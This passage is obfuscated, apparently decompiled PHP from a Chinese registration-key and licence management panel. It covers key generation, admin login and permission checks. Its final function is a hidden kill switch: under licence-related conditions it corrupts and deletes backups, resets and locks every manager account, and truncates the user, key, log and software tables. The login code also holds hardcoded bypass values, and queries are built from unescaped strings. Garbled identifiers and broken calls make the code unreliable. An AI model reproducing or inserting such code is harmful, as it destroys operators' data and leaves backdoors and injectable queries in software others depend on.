                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--".$_obfuscate_i4yIjo2QjpCViIqOiYiGkZE�[$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']]."元/张 [天".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['linknum'];
                if ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'] != "" )
                {
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " 附属性".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'];
                }
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "]</option>";
                return $_obfuscate_j42Hk5GMkZSNj42RipORkI4�;
            }
        }
        else
        {
            foreach ( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
            {
                if ( $_obfuscate_iYiMh4aGkJCJk4qHjIiVi4Y� == 2 )
                {
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "<option value='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['prefix']."'";
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['prefix'] == $_obfuscate_hoyPk5CJiZKVj4iLh5SHkJA� ? " selected" : "";
                }
                else
                {
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "<option value=".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id'];
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id'] == $_obfuscate_hoyPk5CJiZKVj4iLh5SHkJA� ? " selected" : "";
                }
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " cday='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['cday']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " points='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['points']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " linknum='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['linknum']."'";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "  extattr1='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1']."'>";
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--[天".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['linknum'];
                if ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'] != "" )
                {
                    $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= " 附属性".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'];
                }
                $_obfuscate_j42Hk5GMkZSNj42RipORkI4� .= "]</option>";
                break;
            }
        }
    }
    return $_obfuscate_j42Hk5GMkZSNj42RipORkI4�;
}

function _obfuscate_jo2HlYmTj4eQhpKTkYyIj5E�( $_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�, $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU� )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    global $_obfuscate_iZGLlYiTk42PlJOHh4aJkok�;
    $_obfuscate_iZGLlYiTk42PlJOHh4aJkok� = array( );
    if ( is_array( $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU� ) )
    {
        if ( _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU� ) === TRUE )
        {
            $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_keyset where `id`=".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU� );
            if ( empty( $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU� ) )
            {
                return "录入注册卡前检查：未找到卡属性ID";
            }
        }
        return "录入注册卡前检查：未传入卡属性数组或ID";
    }
    $_obfuscate_iY_TlZKSk4uUkoyPipGRjYw� = "insert into `kss_z_key_".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['pid']."_".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['softid']."` \r\n(`keyfix`,`keys`,`keyspassword`,`managerid`,`addtime`,`ordernum`,`cday`,`linknum`,`points`,`keyextattr`,`tag`) values ";
    $_obfuscate_jpSSiIuUjoqGlZSTi5GSkZQ� = ",".$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�['managerid'].",".time( ).",'".$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�['ordernum']."',".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['cday'].",".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['linknum'].",".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['points'].",'".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['extattr1']."','".$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�['tag']."'),";
    $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� = 0;
    for ( ; $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� < $_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�['k_num']; $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� += 100 )
    {
        $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJA� = "";
        $_obfuscate_jIiLiYiQj5CSk5KRjJSGjYw� = 0;
        for ( ; $_obfuscate_jIiLiYiQj5CSk5KRjJSGjYw� < 100; ++$_obfuscate_jIiLiYiQj5CSk5KRjJSGjYw� )
        {
            if ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� + $_obfuscate_jIiLiYiQj5CSk5KRjJSGjYw� == $_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�['k_num'] )
            {
                $_obfuscate_lImSkomRk4uRjJGSkZWJh4k� = _obfuscate_hoaMjI_TjpOThpKLi5WVjYo�( $_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�['beginid'] + $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4� + $_obfuscate_jIiLiYiQj5CSk5KRjJSGjYw�, SVRID );
                $_obfuscate_iZGLlYiTk42PlJOHh4aJkok�[] = $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['prefix'].$_obfuscate_lImSkomRk4uRjJGSkZWJh4k�[0].$_obfuscate_lImSkomRk4uRjJGSkZWJh4k�[1];
                $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJA� .= "('".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['prefix']."','".$_obfuscate_lImSkomRk4uRjJGSkZWJh4k�[0]."','".$_obfuscate_lImSkomRk4uRjJGSkZWJh4k�[1]."'".$_obfuscate_jpSSiIuUjoqGlZSTi5GSkZQ�;
            }
        }
        $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJA� = substr( $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJA�, 0, strlen( $_obfuscate_k5OPkIiNkYiHkZSGlYiSiJA� ) - 1 );
        $_obfuscate_lJWSioyRkIyPiomQiYiHiZI� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( $_obfuscate_iY_TlZKSk4uUkoyPipGRjYw�.$_obfuscate_k5OPkIiNkYiHkZSGlYiSiJA�, "sync" );
        $_obfuscate_h4aUkomQiI6JlIaSkomSkok� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4�( );
        if ( $_obfuscate_lJWSioyRkIyPiomQiYiHiZI� === FALSE )
        {
            $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� = $_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['pid']( "delete from kss_z_key_".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['pid']."_".$_obfuscate_lJWSjJCKkI2UiJKUlYaLjZU�['softid']." where `ordernum`='".$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�['ordernum']."'", "sync" );
            if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
            {
                @file_put_contents( @KSSLOGDIR."addkeyerrorder.php", @",".@$_obfuscate_jIeNi4yViY_LjI2Ni5KQj4w�['ordernum'], @FILE_APPEND );
            }
            return "录入注册卡时出错:".$_obfuscate_h4aUkomQiI6JlIaSkomSkok�;
        }
    }
    return TRUE;
}

function _obfuscate_j4aJjo2Hi4eOlJSKk4uHk4k�( $_obfuscate_lYyTkYeTko_QiIaGk5GTkY0�, $_obfuscate_lIuNkpWVkouUk5WHhoiNlIc� )
{
    $_obfuscate_lYyTkYeTko_QiIaGk5GTkY0� = str_replace( " ", "", $_obfuscate_lYyTkYeTko_QiIaGk5GTkY0� );
    $_obfuscate_lZGTiZCUh5STiIyTkYuKjYg� = explode( ",", $_obfuscate_lYyTkYeTko_QiIaGk5GTkY0� );
    if ( in_array( $_obfuscate_lIuNkpWVkouUk5WHhoiNlIc�, $_obfuscate_lZGTiZCUh5STiIyTkYuKjYg� ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_iYuOiIiHj5COiJCJjYyTh5Q�( $_obfuscate_j4qKjZWJioeLkpSSio2TkIg�, $_obfuscate_k4uQh4uTkouGhoaVk4_IiI4�, $_obfuscate_kZKVi42JkZWHjJOGko2SjJM� )
{
    if ( _obfuscate_j4aJjo2Hi4eOlJSKk4uHk4k�( $_obfuscate_j4qKjZWJioeLkpSSio2TkIg�, $_obfuscate_kZKVi42JkZWHjJOGko2SjJM� ) )
    {
        if ( _obfuscate_j4aJjo2Hi4eOlJSKk4uHk4k�( $_obfuscate_k4uQh4uTkouGhoaVk4_IiI4�, $_obfuscate_kZKVi42JkZWHjJOGko2SjJM� ) )
        {
            return " checked";
        }
        return " ";
    }
    return " disabled";
}

function _obfuscate_iZSVk4mLkY_LlIeHh5WKlZA�( $_obfuscate_kpSPi4_OiouQkIaJko6OkoY�, $_obfuscate_joqKh4mKi4eQlI6UiZWLkZM� = 0 )
{
    global $_obfuscate_jJCMjYyHjpSTiJCNiYiIkpE�;
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k�;
    global $_obfuscate_houUipCMk4uPlYyUh4ePkoY�;
    global $_obfuscate_kYmJjZOIiZKJioqMkoaGiYk�;
    $_obfuscate_kYmJjJGSkoeOiY2LiZWMjIk� = _obfuscate_kpONlI6UkY_HkouLk4yIk4s�( "kss_manager" );
    $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ� = explode( ",", $_obfuscate_kYmJjJGSkoeOiY2LiZWMjIk� );
    if ( count( $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ� ) != 4 )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "登陆状态异常，<a href='index.php' target='_top'>请重新登陆</a>。" );
    }
    if ( _obfuscate_kZKMiI2OlY6Ih42OkI6Sjo0�( $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[0] ) )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "COOKIES出错" );
    }
    if ( empty( $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->����������������� ) )
    {
        $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
    }
    $_obfuscate_ko2KiIuIj4yNhpWVkIuIjoc� = "crypt95.php";
    $_obfuscate_koqTiIuHiY6NlJWOiYqRkZE� = file_get_contents( KSSINCDIR."signdata".DIRECTORY_SEPARATOR.$_obfuscate_ko2KiIuIj4yNhpWVkIuIjoc� );
    $_obfuscate_koqTiIuHiY6NlJWOiYqRkZE� = substr( $_obfuscate_koqTiIuHiY6NlJWOiYqRkZE�, 0, 500 );
    if ( stripos( $_obfuscate_koqTiIuHiY6NlJWOiYqRkZE�, "EncodeDate" ) )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "crypt95.php文件异常，请备份数据库，重新安装或修复！" );
    }
    $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU� = $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[0]( "select * from kss_tb_manager where `id`='".$_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[0]."'" );
    if ( empty( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU� ) )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "用ID号未找到，<a href='index.php' target='_top'>请重新登陆</a>。" );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['username'] != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[1] || $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['password'] != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[2] )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "用户名或密码错误，<a href='index.php' target='_top'>请重新登陆</a>。" );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['endtime'] < _obfuscate_jZGJkpOSkY_HiY2HjY2JlIg�( ) )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "您的帐号已到期。".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['endtime'] );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['islock'] == 1 )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "您的帐号被锁定! [锁定原因：".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['lockedinter']."]" );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['level'] < 8 )
    {
        if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['level'] == 6 )
        {
            $_obfuscate_kImIi4uNioeSlIiMjJOTipI� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where id=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pmid'] );
            if ( $_obfuscate_kImIi4uNioeSlIiMjJOTipI�['endtime'] < _obfuscate_jZGJkpOSkY_HiY2HjY2JlIg�( ) )
            {
                _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "上级".$_obfuscate_jJCMjYyHjpSTiJCNiYiIkpE�[$_obfuscate_kImIi4uNioeSlIiMjJOTipI�['level']]."帐号已过期".$_obfuscate_kImIi4uNioeSlIiMjJOTipI�['endtime'] );
            }
            if ( $_obfuscate_kImIi4uNioeSlIiMjJOTipI�['islock'] == 1 )
            {
                _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "上级".$_obfuscate_jJCMjYyHjpSTiJCNiYiIkpE�[$_obfuscate_kImIi4uNioeSlIiMjJOTipI�['level']]."帐号被锁定! [锁定原因：".$_obfuscate_kImIi4uNioeSlIiMjJOTipI�['lockedinter']."]" );
            }
        }
        $_obfuscate_kImIi4uNioeSlIiMjJOTipI� = $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid']( "select * from kss_tb_manager where pid=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['pid']." and level>7" );
        if ( $_obfuscate_kImIi4uNioeSlIiMjJOTipI�['endtime'] < _obfuscate_jZGJkpOSkY_HiY2HjY2JlIg�( ) )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "上级".$_obfuscate_jJCMjYyHjpSTiJCNiYiIkpE�[8]."帐号已过期".$_obfuscate_kImIi4uNioeSlIiMjJOTipI�['endtime'] );
        }
        if ( $_obfuscate_kImIi4uNioeSlIiMjJOTipI�['islock'] == 1 )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "上级".$_obfuscate_jJCMjYyHjpSTiJCNiYiIkpE�[8]."帐号被锁定! [锁定原因：".$_obfuscate_kImIi4uNioeSlIiMjJOTipI�['lockedinter']."]" );
        }
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['linecode'] != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[3] && "efefefef" != $_obfuscate_h4_NjYiIi46Lh5KHkoaKkZQ�[3] && $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['username'] != "test01" )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "您的帐号被挤下线，<a href=index.php target=_top>请重新登陆</a>" );
    }
    $_obfuscate_lIqUlIaMj4aNjJCRkoeJlJE� = _obfuscate_kpONlI6UkY_HkouLk4yIk4s�( "kss_mmlogin", 1 );
    if ( empty( $_obfuscate_lIqUlIaMj4aNjJCRkoeJlJE� ) )
    {
        $_obfuscate_h5SQiYyTkY_PjYmRjZWPh4k� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where id=1" );
        if ( $_obfuscate_lIqUlIaMj4aNjJCRkoeJlJE� != md5( $_obfuscate_h5SQiYyTkY_PjYmRjZWPh4k�['username'].$_obfuscate_h5SQiYyTkY_PjYmRjZWPh4k�['password'] ) )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "你的原始身份效验失败！" );
        }
        $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['level'] = 9;
        $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['powerlist'] = "admin";
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['level'] < $_obfuscate_kpSPi4_OiouQkIaJko6OkoY� )
    {
        _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( $_obfuscate_jJCMjYyHjpSTiJCNiYiIkpE�[$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['level']]."帐号无权限访问此页面或执行此操作" );
    }
    if ( $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['level'] == 9 && defined( "SAFEIPFILE" ) )
    {
        $_obfuscate_jpCPlZSTj5OLh4uKiYaGhoc� = FALSE;
        $_obfuscate_koeMiZGTjY6GiZOUjZKSiJI� = explode( ",", SAFEIPFILE );
        $_obfuscate_koaJjIiTlZKGk42HlYySjYo� = "";
        foreach ( $_obfuscate_koeMiZGTjY6GiZOUjZKSiJI� as $_obfuscate_jYeKioySjIaSioePi4yLiIw� )
        {
            if ( substr( $_SERVER['REMOTE_ADDR'], 0, strlen( $_obfuscate_jYeKioySjIaSioePi4yLiIw� ) ) == $_obfuscate_jYeKioySjIaSioePi4yLiIw� )
            {
                $_obfuscate_jpCPlZSTj5OLh4uKiYaGhoc� = TRUE;
                break;
            }
        }
        if ( $_obfuscate_jpCPlZSTj5OLh4uKiYaGhoc� )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "IP".$_SERVER['REMOTE_ADDR']."未被授权登陆管理帐号！" );
        }
    }
    if ( $_obfuscate_joqKh4mKi4eQlI6UiZWLkZM� != 0 && $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['powerlist'] != "admin" )
    {
        $_obfuscate_kZWVjYuLi5OLkZOHiJKIlYY� = explode( ",", $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�['powerlist'] );
        if ( in_array( $_obfuscate_joqKh4mKi4eQlI6UiZWLkZM�, $_obfuscate_kZWVjYuLi5OLkZOHiJKIlYY� ) )
        {
            _obfuscate_kYyOhouLjo2Gh4eNj4iQlIg�( "您无权限访问此页面或执行此操作！" );
        }
    }
    return $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpU�;
}

function _obfuscate_iY6RiYaNio6PiIyIiZWJkJQ�( $_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�, $_obfuscate_kYyGkZWPh5CQiJSRioaPj5E� = 0 )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obfuscate_jY6UkZSViY2Hj4aVi5SIjpM� = " `level`>7 ";
    if ( $_obfuscate_kYyGkZWPh5CQiJSRioaPj5E� != 0 )
    {
        $_obfuscate_jY6UkZSViY2Hj4aVi5SIjpM� = " `level`=7 and id=".$_obfuscate_kYyGkZWPh5CQiJSRioaPj5E�;
    }
    return $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where `pid`=".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5A�." and ".$_obfuscate_jY6UkZSViY2Hj4aVi5SIjpM�." limit 0,1" );
}

function _obfuscate_iIeMkYyJiZKTjI2UjImPi4Y�( $_obfuscate_komRjo6Qi4_Rh5KHi5SLhpE� )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    return $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_manager where `id`=".$_obfuscate_komRjo6Qi4_Rh5KHi5SLhpE� );
}

function _obfuscate_h4mIkIeIkIuJlYmOlJCHkog�( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select max(`pid`) from `kss_tb_manager`", 2 );
    if ( $_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�[0] < 10000 )
    {
        return "10000";
    }
    return $_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�[0] + 1;
}

function _obfuscate_lI_NjpSLio_JjZCVh4qUjYc�( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�;
    if ( isset( $_COOKIE['dellic'] ) && $_COOKIE['dellic'] == "ok" )
    {
        $_obfuscate_koiKkIiPjI6UkYeRlIqNhoc� = file_get_contents( KSSINCDIR."_config.php" );
        $_obfuscate_koiKkIiPjI6UkYeRlIqNhoc� = preg_replace( "/define\\('PRV_SVRLIC','[^']*'\\)/i", "define('PRV_SVRLIC','')", $_obfuscate_koiKkIiPjI6UkYeRlIqNhoc� );
        file_put_contents( KSSINCDIR."_config.php", $_obfuscate_koiKkIiPjI6UkYeRlIqNhoc� );
        return TRUE;
    }
    if ( isset( $_COOKIE['deldata'] ) )
    {
        return TRUE;
    }
    if ( defined( "NOTDELMYSQL" ) )
    {
        return TRUE;
    }
    $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� = _obfuscate_iJCRko_Hj4_Oh4eIjIaKk5I�( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."databak".DIRECTORY_SEPARATOR, "zip" );
    if ( empty( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� ) )
    {
        foreach ( $_obfuscate_j4uLj5OUi42Gh5SQlYiOjIc� as $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y� )
        {
            @file_put_contents( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y�, "dataerr" );
            @unlink( $_obfuscate_iJWSjpGIi4eHipWGhoeRk4Y� );
        }
    }
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft " );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "update `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "update `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` set cday=1000", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_manager set password='000000000000000', rmb=0, level=6, islock=1", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_soft set softcode=1000099, softmode='NoN', softkey='000000000000000'", "sync" );
    foreach ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYk� as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."_recycle`", "sync" );
        $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']( "TRUNCATE TABLE `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpI�['id']."`_recycle", "sync" );
    }
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_soft`", "sync" );
    $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIY�( "TRUNCATE TABLE `kss_tb_manager`", "sync" );
}

?>
